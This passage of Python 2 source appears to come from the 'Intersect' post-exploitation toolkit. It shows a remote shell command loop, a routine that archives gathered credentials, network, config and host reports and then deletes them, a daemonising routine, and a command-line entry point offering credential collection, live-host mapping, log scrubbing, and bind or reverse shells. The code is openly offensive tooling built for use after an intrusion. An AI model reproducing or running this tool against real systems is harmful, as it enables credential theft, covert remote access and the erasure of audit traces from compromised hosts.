            conn.send("\n[+] Reports located in: %s " % Temp_Dir)
            conn.send("\nIntersect "+str(os.getcwd())+" >> ")
        elif cmd == ("extask findextras"):
            FindExtras()
            conn.send("\n[+] Extras Gather complete.")
            conn.send("\n[+] Reports located in: %s " % Temp_Dir)
            conn.send("\nIntersect "+str(os.getcwd())+" >> ")
        elif cmd == ("extask scrub"):
            ScrubLog()
            conn.send("\n[+] Scrubbing complete.")
            conn.send("\nIntersect "+str(os.getcwd())+" >> ")
        elif cmd == ('killme'):
            conn.send("[!] Shutting down shell!\n")
            conn.close()
            sys.exit(0)
        elif proc:
            conn.sendall( stdout )
            conn.send("\nIntersect "+str(os.getcwd())+" >> ")


def MakeArchive():
    print("[!] Generating report archive....This might take a minute or two..")
    os.chdir(Temp_Dir)
    tar = tarfile.open("reports.tar.gz", "w:gz")
    if os.path.exists("credentials") is True:
        tar.add("credentials/")
        os.system("rm -rf credentials/")
        if os.path.exists("network/") is True:
           tar.add("network/")
           os.system("rm -rf network/")
        if os.path.exists("extras/") is True:
           tar.add("extras/")
           os.system("rm -rf extras/")
        if os.path.exists("configs/") is True:
           tar.add("configs/")
           os.system("rm -rf configs/")
        if os.path.exists("osinfo/") is True:
           tar.add("osinfo/")
           os.system("rm -rf osinfo/")
        if os.path.exists("hosts/") is True:
           tar.add("hosts/")
           os.system("rm -rf hosts/")
        print("[!] Archive is located in %s" % Temp_Dir)
    else:
         print("[!] No reports exist to archive!")
    tar.close()
    sys.exit(2)


def daemon(stdin='/dev/null', stdout='/dev/null', stderr='/dev/null'):
    try: 
        pid = os.fork() 
        if pid > 0:
            sys.exit(0) 
    except OSError, e: 
        print >>sys.stderr, "fork one failed: %d (%s)" % (e.errno, e.strerror) 
        sys.exit(1)

    os.chdir("/") 
    os.setsid() 
    os.umask(0) 

    try: 
        pid = os.fork() 
        if pid > 0:
            print "[+] Daemon PID %d" % pid 
            sys.exit(0) 
    except OSError, e: 
        print("[!] Intersect will now run in the background. Check %s for your reports." % Temp_Dir)
        print >>sys.stderr, "fork #2 failed: %d (%s)" % (e.errno, e.strerror) 
        sys.exit(1) 

    si = file(stdin, 'r')
    so = file(stdout, 'a+')
    se = file(stderr, 'a+', 0)
    os.dup2(si.fileno(), sys.stdin.fileno())
    os.dup2(so.fileno(), sys.stdout.fileno())
    os.dup2(se.fileno(), sys.stderr.fileno())
    

def main(argv):
    try:
        opts, args = getopt.getopt(argv, "dhtonlcesbra", ["daemon", "help", "tar", "os-info", "network", "live hosts", "credentials", "extras", "scrub", "bind", "reverse", "all-tests"])
    except getopt.GetoptError, err:
        print str(err) 
        usage()
        Shutdown()
    for o, a in opts:
        if o in ("-d", "--daemon"):
            daemon()
        elif o in ("-h", "--help"):
            usage()
	    Shutdown()
	    sys.exit(2)	
        elif o in ("-t", "--tar"):
            MakeArchive()
        elif o in ("-o", "--os-info"):
            Gather_OS()
        elif o in ("-n", "--network"):
             NetworkInfo()
        elif o in ("-l", "--live-hosts"):
             NetworkMap()
        elif o in ("-c", "--credentials"):
             GetCredentials() 
        elif o in ("-e", "--extras"): 
             FindExtras()
        elif o in ("-s", "--scrub"):
	     ScrubLog()
        elif o in ("-b", "--bind"):
             bindShell()
        elif o in ("-r", "--reverse"):
             reverseShell()
        elif o in ("-a", "--all-tests"):
             Gather_OS()
             NetworkInfo()
             NetworkMap()
             GetCredentials()
             FindExtras()
             MakeArchive()
        else:
            assert False, "unhandled option"
    Shutdown()
  
environment()
if __name__ == "__main__":
    if len(sys.argv) <=1:
        usage()
    main(sys.argv[1:])


